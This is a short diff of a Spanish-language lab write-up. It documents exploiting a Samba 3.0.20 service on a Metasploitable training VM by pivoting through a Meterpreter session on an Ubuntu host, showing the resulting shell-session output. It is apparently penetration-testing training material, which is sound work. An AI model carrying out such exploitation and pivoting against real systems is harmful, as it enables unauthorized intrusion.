@@ -946,20 +946,17 @@ exploit
 ```
 
 **Resultado:**
-```
-[*] 192.168.8.133:139     - Host could not be identified: Unix (Samba 3.0.20-Debian)
-```
-
-![Exploit Samba](img/samba1.jpg)
-
-
-
-**Resultado:**
 
 * Command shell session 2 opened (192.168.8.131:40362 -> 192.168.8.133:4444 via session 1)
 Ya tenemos acceso a Metasploitable a través del pivoting
 via session 1 → Está usando mi sesión Meterpreter en Ubuntu como puente
 192.168.8.131 (Ubuntu) → 192.168.8.133 (Metasploitable)
+
+![Exploit Samba](img/samba1.jpg)
+
+
+
+
 ---
 
 ### 6.2 Verificar acceso
